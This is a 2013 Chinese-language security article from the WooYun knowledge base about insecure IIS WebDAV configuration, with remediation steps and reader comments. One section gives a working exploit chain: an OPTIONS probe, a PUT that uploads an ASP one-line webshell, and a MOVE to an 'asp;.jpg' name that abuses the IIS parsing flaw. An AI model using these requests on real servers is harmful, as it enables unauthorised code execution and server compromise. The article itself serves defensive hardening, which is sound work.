<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">IIS WebDAV安全配置</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">瞌睡龙</a> <span class="bull">·</span> <time title="2013/07/15 16:31" ui-time="" datetime="2013/07/15 16:31" class="published ng-binding ng-isolate-scope">2013/07/15 16:31</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h3>0x00 简介</h3><hr><p>WebDAV是一种基于 HTTP 1.1协议的通信协议.它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法。</p><p>使应用程序可直接对Web Server直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。</p><p>IIS实现Webdav是采用的其两种接口CGI、ISAPI的ISAPI接口。</p><p>但因为其没有采用影射的方式，所以IIS的主程序w3svc.dll本身包含了Webdav的信息。</p><p>其识别出是Webdav的请求后就调用Webdav的处理模块httpext.dll。</p><p>对于常见几种请求方法<code>GET、HEAD、POST</code>等，因为常见一些映射都支持。</p><p>所以不能以请求方法作为Webdav请求的判断，w3svc.dll就根据请求头的字段识别。</p><p>如果请求头里面包含<code>Translate:</code>、<code>If:</code>、<code>Lock-Token:</code>中的一种，就认为是Webdav的请求。</p><p><code>Translate:</code>就是那个<code>Translate:f</code>的泄露源代码的一个请求头，其实设置别的两个也是一样的。</p><p>可能很多IDS是没有这点知识的。W3svc.dll还内置了几个别的请求方法<code>TRACK</code>、<code>TRACE</code>等。</p><p><code>TRACK</code>就是用于调试错误的，如果收到这样的请求头，w3svc.dll会原样返回请求数据。</p><p>相当于我们常见的ping.exe。</p><p>IIS对<code>TRACK</code>请求没有进行LOG记录，这点我们可以用于来获得banner。</p><p>对于IIS将优于大家习惯使用的<code>HEAD</code>。</p><p>如果上面的请求方法没匹配，那么w3svc.dll就会认为是Webdav的请求，交给httpext.dll处理了。</p><p>这些请求包含Webdav支持的<code>PROPFIND</code>、<code>PROPPATCH</code>、<code>MKCOL</code>、<code>DELETE</code>、<code>PUT</code>、<code>COPY</code>、<code>MOVE</code>、<code>LOCK</code>、<code>UNLOCK</code>等。</p><h3>0x01 配置</h3><hr><p>为了安全上的考虑，IIS默认并不会启动WebDAV的功能，因此必须另外来激活它。</p><p>通过启动“IIS管理器”，展开本地计算机，选择“Web服务扩展”，选择“允许”的途径来启动WebDAV功能。</p><p>开启WebDAV之后，IIS就支持<code>PROPFIND</code>、<code>PROPPATCH</code>、<code>MKCOL</code>、<code>DELETE</code>、<code>PUT</code>、<code>COPY</code>、<code>MOVE</code>、<code>LOCK</code>、<code>UNLOCK</code>等方法了。</p><p><img alt="enter image description here" img-src="ea43a37385ae5c071326b70c30b3e3c81405b11e.jpg"></p><p>当IIS中的配置允许写入的时候就可以直接PUT文件上去，由此可能引发非常严重的安全问题，强烈建议禁制</p><p><img alt="enter image description here" img-src="30cdb5f44bd056bb33cde34098aa5b84ac423b6f.jpg"></p><h3>0x02 危害</h3><hr><p>当开启了WebDAV后，IIS中又配置了目录可写，便会产生很严重的问题。 wooyun上由此配置产生的问题很多，并且有老外黑了一群中国政府站有一部分就是由于此配置。 危害巨大，操作简单，直接批量扫描，上传shell。</p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-018158">WooYun: 闪动科技webserver配置不当可取shell</a></p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2011-02238">WooYun: 瑞达信息安全产业股份有限公司IIS写入漏洞</a></p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2011-02765">WooYun: 海航webdav漏洞导致服务器沦陷</a></p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2011-03581">WooYun: 阿里某邮件系统服务器配置不当</a></p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2012-05911">WooYun: 国家某局某文件系统存在严重安全问题</a></p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2012-06196">WooYun: 国内某大型风电工控系统应用配置失误</a></p><h3>0x03 查找存在问题的服务器</h3><hr><p>对服务器发送OPTION包：</p><pre><code>OPTIONS / HTTP/1.1
Host: www.test.com
</code></pre><p>返回响应头如下：</p><pre><code>HTTP/1.1 200 OK
Server: Microsoft-IIS/6.0
X-Powered-By: ASP.NET
MS-Author-Via: DAV
Content-Length: 0
Accept-Ranges: none
DASL: &lt;DAV:sql&gt;
DAV: 1, 2
Public: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Allow: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
Cache-Control: private
</code></pre><p>当ALLOW中包含如上方法时，可以确定服务器开启了WebDAV。</p><p>此时可以用PUT上传文件，但是不可以直接上传可执行脚本文件，可以先上传一个其他类型的文件，然后MOVE成脚本文件。</p><pre><code>PUT /test.txt HTTP/1.1
Host: www.test.com
Content-Length: 23

&lt;%eval request("a")%&gt;
</code></pre><p>启用了“WebDAV”扩展，并且复选了“写入”，就可以写入txt文件了。要想使用MOVE命令将其更名为脚本文件后缀，必须还复选上“脚本资源访问”。</p><p>但是发现利用IIS的解析漏洞，可以MOVE成<code>test.asp;.jpg</code>，然后就可以当做shell来执行了</p><pre><code>MOVE /test.txt HTTP/1.1
Host: www.test.com
Destination: http://www.test.com/test.asp;.jpg
</code></pre><p>有一个开源的DAV管理工具，使用工具直接查看：</p><p><a href="http://www.davexplorer.org/download.html">http://www.davexplorer.org/download.html</a></p><h3>0x03 修复方案</h3><hr><h4>1 禁用WebDAV。</h4><p>通常情况下网站不需要支持额外的方法，右键WebDAV，点击禁用即可。</p><h4>2 如果要使用WebDAV的话，加上权限验证。</h4><p>如果选取“脚本资源访问”，则用户将具备修改WebADV文件夹内的脚本文说明件(scriptfile)的功能。</p><p>除了此处的虚拟目录权限外，还需要视NTFS权限，才可以决定用户是否有权限来访问WebDAV文件夹内的文件。</p><p>WebDAV文件夹的NTFS权限给予用户适当的NTFS权限。</p><p>首先请设置让Everyone组只有“读取”的权限，然后再针对个别用户给予“写入”的权限，例如我们给予用户“User”写入的权限。</p><p>选择验证用户身份的方法启动“IIS管理器”，然后右击WebDAV虚拟目录，选择“属性”→“目录安全性”，单击“身份验证和访问控制”处的编辑按钮。</p><p>不要选取“启用匿名访问”，以免招致攻击。选择安全的验证方法，选择“集成Windows身份验证”。</p><p><img alt="enter image description here" img-src="6c772572f00ac65be3ab765c20222826b46d0e72.jpg"></p><p>参考：</p><p><a href="http://hi.baidu.com/yuange1975/item/a836d31096b5b959f1090e89">http://hi.baidu.com/yuange1975/item/a836d31096b5b959f1090e89</a></p><p><a href="http://www.daxigua.com/archives/1597">http://www.daxigua.com/archives/1597</a></p><p><a href="http://www.daxigua.com/archives/2750">http://www.daxigua.com/archives/2750</a></p><p><a href="http://www.daxigua.com/archives/2747">http://www.daxigua.com/archives/2747</a></p><p><a href="http://blog.163.com/wfruee@126/blog/static/4116699420123261427232/">http:<span class="__cf_email__" data-cfemail="86a9a9e4eae9e1a8b7b0b5a8e5e9eba9f1e0f4f3e3e3c6b7b4b0">[email&#160;protected]</span>/blog/static/4116699420123261427232/</a></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="donate" style="padding:10px;border-top:1px solid #d9d9d9;text-align:center"><span>碎银子打赏，作者好攒钱娶媳妇：</span><br><br><img src="http://static.wooyun.org/wooyun/upload/donate/20141017203549ef27b55a7921e022214b5780c48f81e0.png" style="width:200px;height:200px"></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/345" rel="bookmark" id="re1">在线支付逻辑漏洞总结</a></li><li><a href="http://drops.wooyun.org/papers/346" rel="bookmark" id="re2">终端机的安全性</a></li><li><a href="http://drops.wooyun.org/papers/154" rel="bookmark" id="re3">由参数URL想到的</a></li><li><a href="http://drops.wooyun.org/web/3295" rel="bookmark" id="re4">密码找回功能可能存在的问题（补充）</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ASDAS</span> <span class="reply-time">2016-01-02 14:34:06</span></div><p></p><p>A</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ohlinge</span> <span class="reply-time">2015-11-28 16:00:51</span></div><p></p><p>目前这个漏洞应该没有存在了吧？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Elliott</span> <span class="reply-time">2015-08-06 12:12:29</span></div><p></p><p>科普</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">imlonghao</span> <span class="reply-time">2015-06-09 11:35:28</span></div><p></p><p>不知道webdav的用处是什么。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">随页清风</span> <span class="reply-time">2013-12-08 14:31:48</span></div><p></p><p>不错，有学习了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Stream</span> <span class="reply-time">2013-10-19 11:30:56</span></div><p></p><p>webdav列目录需要哪些条件?<br>是要allow哪个方法吗?</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2013-07-15 19:46:10</span></div><p></p><p>深入浅出！</p><p></p></div></div></div></div></div></main>